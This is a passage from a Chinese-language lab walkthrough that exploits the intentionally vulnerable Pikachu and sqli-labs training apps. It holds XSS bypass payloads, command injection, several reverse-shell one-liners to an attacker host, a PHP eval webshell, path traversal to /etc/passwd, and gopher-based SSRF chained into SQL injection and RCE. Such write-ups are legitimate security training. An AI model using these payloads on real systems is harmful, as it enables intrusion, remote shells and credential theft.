尝试执行 javascript 脚本

```html
<script>alert(1);</script>
```

![尝试执行 javascript 脚本](./../../../../images/Pikachu/Cross-Site%20Scripting/xss之过滤/尝试执行 javascript 脚本.png)

> 发现返回了 `>` ，其它的字符皆被过滤

分开执行字符串

```
<script>
```

> 只返回了 `>` 

```
script>
```

> 返回了 `script>` 

```
<script
```

> 没有返回，判断是过滤了 `<script` 

```
</script>
```

> 返回了 `/>` 

```
</script
```

> 没有返回，判断是过滤了 `</script` 

```
alert(1);
```

> 返回了 `alert(1);` 

> 说明过滤了 `<script` ，和 `</script` 

使用大小写绕过

```html
<sCript>alert(1);</scRipt>
```

![使用大小写绕过](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8B%E8%BF%87%E6%BB%A4/%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87.png)

> 成功绕过

使用事件绕过

```html
<a href= "#" onclick="alert(1);"></a>
```

> 被过滤 

```html
<img src="#" onmouseover="alert(1);">
```

> 成功绕过

### 3.2.8. xss之htmlspecialchars

>http://centos7-6.local/pikachu/vul/xss/xss_02.php

输入特殊字符，查看是否过滤

```
'"<>123;
```

```
&quot;&lt;&gt;123'
```

![输入特殊字符，查看是否过滤](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8Bhtmlspecialchars/%E8%BE%93%E5%85%A5%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E8%BF%87%E6%BB%A4.png)

> 发现使用了 `htmlspecialchars` 函数转换，但是没有过滤 单引号 `'` ，因此猜测可能是 `ENT_COMPAT` 类型过滤

查看源码

```html
<a href=&quot;&lt;&gt;123;'>'"<>123;</a>
```

> 发现输入在标签内，因此可利用单引号 `'` 构造事件绕过

执行

```
'#' onclick='alert(1);'
```

点击反馈，触发事件

![点击反馈，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8Bhtmlspecialchars/%E7%82%B9%E5%87%BB%E5%8F%8D%E9%A6%88%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)

### 3.2.9. xss之href输出

> http://centos7-6.local/pikachu/vul/xss/xss_03.php

输入特殊字符，查看是否过滤

```
'"<>123;
```

```html
<a href="'&quot;<>123"> 阁下自己输入的url还请自己点一下吧</a>
```

> 发现双引号 `"` 被转义为 `&quot;` ，而且使用的是 href 属性
>
> 由于输入在双引号 `href=""` 内，因此无法使用单引号 `'` 绕过

使用 href 绕过

```
javascript:alert(1);
```

```html
<a href="javascript:alert(1);"> 阁下自己输入的url还请自己点一下吧</a>
```

点击反馈，触发事件

![点击反馈，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA/%E7%82%B9%E5%87%BB%E5%8F%8D%E9%A6%88%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)

### 3.2.10. xss之js输出

> http://centos7-6.local/pikachu/vul/xss/xss_04.php

输入特殊字符，查看是否过滤

```
'"<>123;
```

> 发现没有反馈

在源代码中查找相关源码

![在源代码中查找相关源码](./../../../../images/Pikachu/Cross-Site%20Scripting/xss之js输出/在源代码中查找相关源码.png)

```html
<script>
    $ms=''"<>123;';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }


</script>
```

> 发现字符串被包裹在 `<script>` 中的 `$ms=''` 中，但是并没有过滤
>
> 由于没有反馈，无法使用事件绕过

利用 `'` 闭合 `$ms=''` ，并利用 `</script>` 闭合  `<script>` 

```
#'; alert(1);</script>
```

```html
<script>
    $ms='#'; alert(1);</script>';
```

> 成功弹窗
>
> 使用 `;` 结束 `$ms='#'` 后才能执行 `alert(1)` 

### 2.3. RCE

### 2.3.1. exec "ping"

> http://centos7-6.local/pikachu/vul/rce/rce_ping.php

尝试执行拼接命令

```
127.0.0.1 ; whoami
```

![尝试执行拼接命令](./../../../../images/Pikachu/RCE/exex%20%E2%80%9Cping%E2%80%9D/%E5%B0%9D%E8%AF%95%E6%89%A7%E8%A1%8C%E6%8B%BC%E6%8E%A5%E5%91%BD%E4%BB%A4.png)

> 得到反馈：apache，命令执行成功

侦听端口

```shell
┌──(root㉿kali-23)-[~]
└─# nc -lvnp 4444
```

反弹 shell 

```
127.0.0.1 ; bash -i >& /dev/tcp/kali-23.local/4444 0>&1
```

> 成功连接

使用 burp 的 collaborator

```
xdeg7e5md5hw37w3sdscllarkiq9ez2o.oastify.com
```

![使用 burp 的 collaborator](./../../../../images/Pikachu/RCE/exex%20%E2%80%9Cping%E2%80%9D/%E4%BD%BF%E7%94%A8%20burp%20%E7%9A%84%20collaborator.png)

执行拼接命令

```
`whoami`.xdeg7e5md5hw37w3sdscllarkiq9ez2o.oastify.com
```

![执行拼接命令](./../../../../images/Pikachu/RCE/exex%20%E2%80%9Cping%E2%80%9D/%E6%89%A7%E8%A1%8C%E6%8B%BC%E6%8E%A5%E5%91%BD%E4%BB%A4.png)

### 2.3.2. exec "eval"

> http://centos7-6.local/pikachu/vul/rce/rce_eval.php

### 2.4. File Inclusion

### 2.4.1. File Inclusion(local)

查看任意一个球员可以得到 url

```
http://cent7-6.local/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&submit=提交
```

> 在 url 中可以看到这里是使用的 `filename=` 函数查找的当前目录下的文件

查看返回的图片地址

```
http://cent7-6.local/pikachu/vul/fileinclude/include/kobe.png
```

当使用 `filename=` 访问 `file1.php` 时使用的是 `filename=file1.php` `因此fi_local.php` 与 `file1.php` 可能在同一目录 `fileinclude` 中，而调取的图片 `kobe.png` 的路径是 `/fileinclude/include/kobe.png` ，尝试访问

```
http://cent7-6.local/pikachu/vul/fileinclude/fi_local.php?filename=./include/kobe.png&submit=提交
```

报错：

> Warning: include(include/./include/kobe.png): failed to open stream: No such file or directory in /var/www/html/pikachu/vul/fileinclude/fi_local.php on line 23
>
> Warning: include(): Failed opening 'include/./include/kobe.png' for inclusion (include_path='.:/usr/share/pear:/usr/share/php') in /var/www/html/pikachu/vul/fileinclude/fi_local.php on line 23

> 其中 `在 /var/www/html/pikachu/vul/fileinclude/fi_local.php 第 23 行打开 'include/./include/tmac.png'` 失败 

说明 `fi_local.php` 是直接从 `include` 目录中查找的，因此尝试直接访问 `tmac.png` 

```
http://cent7-6.local/pikachu/vul/fileinclude/fi_local.php?filename=./kobe.png&submit=提交
```

> 成功，判断 `fi_local.php` 是从 `/var/www/html/pikachu/vul/fileinclude/include/` 中开始查找的

访问密码文件

```
http://cent7-6.local/pikachu/vul/fileinclude/fi_local.php?filename=../../../../../../../etc/passwd&submit=提交
```

> 成功得到密码文件

### 2.4.2 File Inclusion(remote)

查看任意一个球员可以得到 url

```
http://cent7-6.local/pikachu/vul/fileinclude/fi_remote.php?filename=include/file1.php&submit=提交
```

> 可以看到这次是从 `fileinclude` 目录开始查询的
>
> ```
> /var/www/html/pikachu/vul/fileinclude/
> ```

访问密码文件

```
http://cent7-6.local/pikachu/vul/fileinclude/fi_remote.php?filename=../../../../../../etc/passwd&submit=提交
```

> 成功得到密码文件

### 2.5. Unsafe Filedownload

尝试下载任意一个文件，并获取其 url

```
http://cent7-6.local/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
```

查看图片文件的 url

```
http://cent7-6.local/pikachu/vul/unsafedownload/download/kb.png
```

> 可以看到目标时直接使用 `filename=kb.png` 加载的文件，因此加载路径为
>
> ```
> /var/www/html/pikachu/vul/unsafedownload/download/
> ```

尝试下载密码文件

```
http://cent7-6.local/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../../../etc/passwd
```

> 成功得到密码文件

### 2.6. unsafe upfileupload

### 2.6.1. client check

在浏览器开发者工具中使用 `Curl+Shift+P` 运行命令禁用 `javascript` 

![在浏览器开发者工具中使用 `Curl+Shift+P` 运行命令禁用 `javascript` ](./../../../../images/Pikachu/unsafe%20upfileupload/client%20check/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7%E4%B8%AD%E4%BD%BF%E7%94%A8%20%60Curl+Shift+P%60%20%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%A6%81%E7%94%A8%20%60javascript%60%20.png)

> 上传成功
>
> 得到文件保存的路径为：uploads/webshell.php

使用 AntSword 连接

```
http://cent7-6.local/pikachu/vul/unsafeupload/uploads/webshell.php
hacker
```

> 成功

### 2.6.2. MIME type

在 burp 开启拦截，上传 `webshell.jpg`

```php
<?php @eval($_POST["hacker"]);?>
```

在请求包中将 `webshell.jpg` 修改为 `webshell.php` 

```http
POST /pikachu/vul/unsafeupload/clientcheck.php HTTP/1.1
Host: cent7-6.local
Content-Length: 330
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRBBlyDDS9AkWPaG1

------WebKitFormBoundaryRBBlyDDS9AkWPaG1
Content-Disposition: form-data; name="uploadfile"; filename="webshell.php"
Content-Type: image/jpeg

<?php @eval($_POST["hacker"]);?>

------WebKitFormBoundaryRBBlyDDS9AkWPaG1
Content-Disposition: form-data; name="submit"

开始上传
------WebKitFormBoundaryRBBlyDDS9AkWPaG1--
```

> 上传成功
>
> 得到文件保存的路径为：uploads/webshell.php
>
> 使用 AntSword 连接即可

### 2.6.3. getPikachuize

在 kali 创建 php 文件

```shell
┌──(root㉿kali-23)-[~]
└─# vim webshell.php
```

```php
<?php @eval($_POST["hacker"]);?>
```

在 kali 中将 php 代码追加大正常的图片文件中并将 `webshell.png` 上传

```shell
┌──(root㉿kali-23)-[~]
└─# cat /root/webshell.php >> /root/webshell.png
```

使用 AntSword 利用之前的文件包含漏洞连接

```
http://cent7-6.local/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2024/04/26/705476662bb827c7c34688312034.png&submit=%E6%8F%90%E4%BA%A4
hacker
```

> 成功

### 2.7. SSRF

### 2.7.1. SSRF(curl)

> http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php

选择 SSRF(curl) ，查看 url 

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
```

读取目标的密码文件

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
```

![读取目标的密码文件](./../../../../images/Pikachu/SSRF/SSRF(curl)/%E8%AF%BB%E5%8F%96%E7%9B%AE%E6%A0%87%E7%9A%84%E5%AF%86%E7%A0%81%E6%96%87%E4%BB%B6.png)

探测目标的 3306 端口是否开放

> 可利用这个漏洞写脚本探测

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306
```

![探测目标的端口是否开放](./../../../../images/Pikachu/SSRF/SSRF(curl)/%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%90%A6%E5%BC%80%E6%94%BE.png)

> 不同的协议返回的端口信息不同，某些协议可能会显示而其它协议不会显示

查看 curl 支持的协议

```shell
[root@centos ~]# curl -V
```

```
curl 7.29.0 (x86_64-redhat-linux-gnu) libcurl/7.29.0 NSS/3.36 zlib/1.2.7 libidn/1.28 libssh2/1.4.3
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp scp sftp smtp smtps telnet tftp 
Features: AsynchDNS GSS-Negotiate IDN IPv6 Largefile NTLM NTLM_WB SSL libz unix-sockets
```

### 2.7.2. SSRF(file_get_content)

> http://centos7-6.local/pikachu/vul/ssrf/ssrf_fgc.php

选择 SSRF(file_get_content) ，查看 url 

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php
```

读取目标 web 服务的配置文件

> 推荐使用 `php://filter/read=convert.base64-encode/resource=` 读取任意文件，以文件格式
>
>  `php://filter/read` 只能在使用 `file_get_content` 协议的 ssrf 漏洞中使用

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=/var/www/html/pikachu/inc/config.inc.php
```

![读取目标 web 服务的配置文件](./../../../../images/Pikachu/SSRF/SSRF(file_get_content)/%E8%AF%BB%E5%8F%96%E7%9B%AE%E6%A0%87%20web%20%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png)

复制得到的 base64 编码来解码

```shell
[root@centos ~]# echo "PD9waHAKLy/lhajlsYBzZXNzaW9uX3N0YXJ0CnNlc3Npb25fc3RhcnQoKTsKLy/lhajlsYDlsYXorr7nva7ml7bljLoKZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCgnQXNpYS9TaGFuZ2hhaScpOwovL+WFqOWxgOiuvue9rum7mOiupOWtl+espgpoZWFkZXIoJ0NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwovL+WumuS5ieaVsOaNruW6k+i/nuaOpeWPguaVsApkZWZpbmUoJ0RCSE9TVCcsICcxMjcuMC4wLjEnKTsvL+WwhmxvY2FsaG9zdOaIluiAhTEyNy4wLjAuMeS/ruaUueS4uuaVsOaNruW6k+acjeWKoeWZqOeahOWcsOWdgApkZWZpbmUoJ0RCVVNFUicsICdyb290Jyk7Ly/lsIZyb2905L+u5pS55Li66L+e5o6lbXlzcWznmoTnlKjmiLflkI0KZGVmaW5lKCdEQlBXJywgJzEyMzQ1NicpOy8v5bCGcm9vdOS/ruaUueS4uui/nuaOpW15c3Fs55qE5a+G56CB77yM5aaC5p6c5pS55LqG6L+Y5piv6L+e5o6l5LiN5LiK77yM6K+35YWI5omL5Yqo6L+e5o6l5LiL5L2g55qE5pWw5o2u5bqT77yM56Gu5L+d5pWw5o2u5bqT5pyN5Yqh5rKh6Zeu6aKY5Zyo6K+0IQpkZWZpbmUoJ0RCTkFNRScsICdwaWthY2h1Jyk7Ly/oh6rlrprkuYnvvIzlu7rorq7kuI3kv67mlLkKZGVmaW5lKCdEQlBPUlQnLCAnMzMwNicpOy8v5bCGMzMwNuS/ruaUueS4um15c3Fs55qE6L+e5o6l56uv5Y+j77yM6buY6K6kdGNwMzMwNgoKPz4K" | base64 -d
```

```php
<?php
//全局session_start
session_start();
//全局居设置时区
date_default_timezone_set('Asia/Shanghai');
//全局设置默认字符
header('Content-type:text/html;charset=utf-8');
//定义数据库连接参数
define('DBHOST', '127.0.0.1');//将localhost或者127.0.0.1修改为数据库服务器的地址
define('DBUSER', 'root');//将root修改为连接mysql的用户名
define('DBPW', '123456');//将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说!
define('DBNAME', 'pikachu');//自定义，建议不修改
define('DBPORT', '3306');//将3306修改为mysql的连接端口，默认tcp3306

?>
```

探测目标的 3306 端口是否开放

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_fgc.php?url=http://127.0.0.1:3306
```

### 2.7.3. ssrf-gopher 协议利用

> 利用 ssrf-gopher 协议可以对 ftp、memcache、mysql、telnet、redis 等服务进行攻击，可以构造发送 get  post 请求包

格式

```
gopher://<host>:<port>/_<data>
```

**测试发送请求**

开启 apache，并侦听端口

```shell
┌──(root㉿kali)-[~]
└─# systemctl start apache2.service && systemctl status apache2.service && nc -lp 4444
```

发送数据

```shell
[root@centos ~]# curl gopher://kali.local:4444/_123456
```

接收到数据

```shell
┌──(root㉿kali)-[~]
└─# nc -lp 4444 
123456
```

**发送 get 请求**

构造 get 请求页面

```shell
┌──(root㉿kali)-[~]
└─# vim /var/www/html/get.php
```

```php
<?php
	echo "Hello ".$_GET["name"]."\n"
?>
```

发送 http 协议请求

```shell
[root@centos ~]# curl http://kali.local/get.php?name=world
Hello world
```

访问

> http://kali.local/get.php?name=world

使用 burp 拦截请求数据包，并将请求数据包保存到 get.txt 

> get 请求只取必要的两行（不能忽略空行）

```shell
┌──(root㉿kali)-[~]
└─# vim get.txt
```

```http
GET /get.php?name=world HTTP/1.1
Host: kali.local


```

使用 gopher_encode 对 get.txt 进行 gopher 格式的编码转换

```shell
┌──(root㉿kali)-[~]
└─# python3 /root/tools/scripts/gopher_encode.py get.txt
```

```
_GET%20/get.php%3Fname%3Dworld%20HTTP/1.1%0D%0AHost%3A%20kali.local%0D%0A%0D%0A%0D%0A
```

发送数据

```shell
[root@centos ~]# curl gopher://kali.local:80/_GET%20/get.php%3Fname%3Dworld%20HTTP/1.1%0D%0AHost%3A%20kali.local%0D%0A%0D%0A%0D%0A
```

```http
HTTP/1.1 200 OK
Date: Wed, 03 Jan 2024 15:06:59 GMT
Server: Apache/2.4.58 (Debian)
Content-Length: 12
Content-Type: text/html; charset=UTF-8

Hello world
```

**发送 post 请求**

构造 get 请求页面

```shell
┌──(root㉿kali)-[~]
└─# systemctl start apache2.service && vim /var/www/html/post.php
```

```php
<?php
	echo "Hello ".$_POST["name"]."\n"
?>
```

发送 http 协议请求

```shell
[root@centos ~]# curl http://kali.local/post.php -d "name=world"
Hello world
```

访问

> http://kali.local/post.php

使用 hackbar 的 Use POST method 

```
name=world
```

![使用 hackbar 的 Use POST method](./../../../../images/Pikachu/SSRF/ssrf-gopher%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/%E4%BD%BF%E7%94%A8%20hackbar%20%E7%9A%84%20Use%20POST%20method.png)

使用 burp 拦截请求数据包，并将请求数据包保存到 post.txt 

> post 请求只取必要的五行（不能忽略空行）

```shell
┌──(root㉿kali)-[~]
└─# vim post.txt
```

```http
POST /post.php HTTP/1.1
Host: kali.local
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

name=world
```

使用 gopher_encode 对 test.txt 进行 gopher 格式的编码转换

```shell
┌──(root㉿kali)-[~]
└─# python3 /root/tools/scripts/gopher_encode.py post.txt
```

```
_POST%20/post.php%20HTTP/1.1%0D%0AHost%3A%20kali.local%0D%0AContent-Length%3A%2010%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Aname%3Dworld%0D%0A
```

发送数据

```shell
[root@centos ~]# curl gopher://kali.local:80/_POST%20/post.php%20HTTP/1.1%0D%0AHost%3A%20kali.local%0D%0AContent-Length%3A%2010%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Aname%3Dworld%0D%0A
```

```http
HTTP/1.1 200 OK
Date: Thu, 28 Dec 2023 08:34:01 GMT
Server: Apache/2.4.57 (Debian)
Content-Length: 12
Content-Type: text/html; charset=UTF-8

Hello world
```

 **get 类型的 sql 注入**

访问

> http://centos.local/sqli-labs/Less-1/

使用 hackbar 进行 sql 注入

>  get 请求只取必要的两行（不能忽略空行）

```
http://centos.local/sqli-labs/Less-1/?id=-1' union select 1,user(),database() -- +
```

使用 burp 拦截请求数据包，并将请求数据包保存到 get.txt 

```shell
┌──(root㉿kali)-[~]
└─# vim get.txt
```

```http
GET /sqli-labs/Less-1/?id=-1%27%20union%20select%201,user(),database()%20--%20+ HTTP/1.1
Host: centos.local


```

使用 gopher_encode 对 get.txt 进行 gopher 格式的编码转换

```shell
┌──(root㉿kali)-[~]
└─# python3 /root/tools/scripts/gopher_encode.py get.txt
```

```
_GET%20/sqli-labs/Less-1/%3Fid%3D-1%2527%2520union%2520select%25201%2Cuser%28%29%2Cdatabase%28%29%2520--%2520%2B%20HTTP/1.1%0D%0AHost%3A%20centos.local%0D%0A%0D%0A%0D%0A
```

构造 url 

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=gopher://127.0.0.1:80/_GET%20/sqli-labs/Less-1/%3Fid%3D-1%2527%2520union%2520select%25201%2Cuser%28%29%2Cdatabase%28%29%2520--%2520%2B%20HTTP/1.1%0D%0AHost%3A%20centos.local%0D%0A%0D%0A%0D%0A
```

 使用 hackbar 的 URL encode 对 `url=` 之后的部分进行二次编码

> 服务器会对接收到的 url 自动解码

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%2Fsqli-labs%2FLess-1%2F%253Fid%253D-1%252527%252520union%252520select%2525201%252Cuser%2528%2529%252Cdatabase%2528%2529%252520--%252520%252B%2520HTTP%2F1.1%250D%250AHost%253A%2520centos.local%250D%250A%250D%250A%250D%250A
```

> 按 EXECUTE 发送即可

**post 类型的 sql 注入**

访问

> http://centos.local/sqli-labs/Less-11/

进行 sql 注入

>  post 请求只取必要的五行（不能忽略空行）

```
admin
'union select user(),database() -- +
```

使用 burp 拦截请求数据包，并将请求数据包保存到 post.txt 

```shell
┌──(root㉿kali)-[~]
└─# vim post.txt
```

```http
POST /sqli-labs/Less-11/ HTTP/1.1
Host: centos.local
Content-Length: 83
Content-Type: application/x-www-form-urlencoded

uname=admin&passwd=%27union+select+user%28%29%2Cdatabase%28%29+--+%2B&submit=Submit
```

使用 gopher_encode 对 get.txt 进行 gopher 格式的编码转换

```shell
┌──(root㉿kali)-[~]
└─# python3 /root/tools/scripts/gopher_encode.py post.txt
```

```
_POST%20/sqli-labs/Less-11/%20HTTP/1.1%0D%0AHost%3A%20centos.local%0D%0AContent-Length%3A%2083%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Auname%3Dadmin%26passwd%3D%2527union%2Bselect%2Buser%2528%2529%252Cdatabase%2528%2529%2B--%2B%252B%26submit%3DSubmit%0D%0A
```

构造 url 

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=gopher://127.0.0.1:80/_POST%20/sqli-labs/Less-11/%20HTTP/1.1%0D%0AHost%3A%20centos.local%0D%0AContent-Length%3A%2083%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Auname%3Dadmin%26passwd%3D%2527union%2Bselect%2Buser%2528%2529%252Cdatabase%2528%2529%2B--%2B%252B%26submit%3DSubmit%0D%0A
```

 使用 hackbar 的 URL encode 对 `url=` 之后的部分进行二次编码

> 服务器会对接收到的 url 自动解码

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Fsqli-labs%2FLess-11%2F%2520HTTP%2F1.1%250D%250AHost%253A%2520centos.local%250D%250AContent-Length%253A%252083%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250A%250D%250Auname%253Dadmin%2526passwd%253D%252527union%252Bselect%252Buser%252528%252529%25252Cdatabase%252528%252529%252B--%252B%25252B%2526submit%253DSubmit%250D%250A
```

> 按 EXECUTE 发送即可

**利用 exec "ping" 反弹 shell**

> http://centos7-6.local/pikachu/vul/rce/rce_ping.php

开启 apache 侦听端口用于接收反弹 shell

```shell
┌──(root㉿kali)-[~]
└─# systemctl start apache2.service && nc -lnvp 4444
```

开启拦截，拼接 ping 命令以反弹 shell 

```
g.cn ; bash -i >& /dev/tcp/kali.local/4444 0>&1
```

![拼接 ping 命令以反弹 shell](./../../../../images/Pikachu/SSRF/ssrf-gopher%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/%E6%8B%BC%E6%8E%A5%20ping%20%E5%91%BD%E4%BB%A4%E4%BB%A5%E5%8F%8D%E5%BC%B9%20shell.png)

使用 burp 拦截请求数据包，并将请求数据包保存到 post.txt 

```shell
┌──(root㉿kali)-[~]
└─# vim post.txt
```

```http
POST /pikachu/vul/rce/rce_ping.php HTTP/1.1
Host: centos.local
Content-Length: 87
Content-Type: application/x-www-form-urlencoded

ipaddress=g.cn+%3B+bash+-i+%3E%26+%2Fdev%2Ftcp%2Fkali.local%2F4444+0%3E%261&submit=ping
```

使用 gopher_encode 对 get.txt 进行 gopher 格式的编码转换

```shell
┌──(root㉿kali)-[~]
└─# python3 /root/tools/scripts/gopher_encode.py post.txt
```

```
_POST%20/pikachu/vul/rce/rce_ping.php%20HTTP/1.1%0D%0AHost%3A%20centos.local%0D%0AContent-Length%3A%2087%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Aipaddress%3Dg.cn%2B%253B%2Bbash%2B-i%2B%253E%2526%2B%252Fdev%252Ftcp%252Fkali.local%252F4444%2B0%253E%25261%26submit%3Dping%0D%0A
```

发送数据

```shell
[root@centos ~]# curl gopher://centos.local:80/_POST%20/pikachu/vul/rce/rce_ping.php%20HTTP/1.1%0D%0AHost%3A%20centos.local%0D%0AContent-Length%3A%2087%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Aipaddress%3Dg.cn%2B%253B%2Bbash%2B-i%2B%253E%2526%2B%252Fdev%252Ftcp%252Fkali.local%252F4444%2B0%253E%25261%26submit%3Dping%0D%0A
```

接收到 shell 

```shell
┌──(root㉿kali)-[~]
└─# systemctl start apache2.service && nc -lnvp 4444        
listening on [any] 4444 ...
connect to [192.168.1.30] from (UNKNOWN) [192.168.1.50] 40934
bash: no job control in this shell
bash-4.2$
```

构造 url 

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=gopher://centos.local:80/_POST%20/pikachu/vul/rce/rce_ping.php%20HTTP/1.1%0D%0AHost%3A%20centos.local%0D%0AContent-Length%3A%2087%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Aipaddress%3Dg.cn%2B%253B%2Bbash%2B-i%2B%253E%2526%2B%252Fdev%252Ftcp%252Fkali.local%252F4444%2B0%253E%25261%26submit%3Dping%0D%0A
```

 使用 hackbar 的 URL encode 对 `url=` 之后的部分进行二次编码

> 服务器会对接收到的 url 自动解码

```
http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php?url=gopher%3A%2F%2Fcentos.local%3A80%2F_POST%2520%2Fpikachu%2Fvul%2Frce%2Frce_ping.php%2520HTTP%2F1.1%250D%250AHost%253A%2520centos.local%250D%250AContent-Length%253A%252087%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250A%250D%250Aipaddress%253Dg.cn%252B%25253B%252Bbash%252B-i%252B%25253E%252526%252B%25252Fdev%25252Ftcp%25252Fkali.local%25252F4444%252B0%25253E%2525261%2526submit%253Dping%250D%250A
```

> 按 EXECUTE 发送即可

---

参考链接

- [Pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)
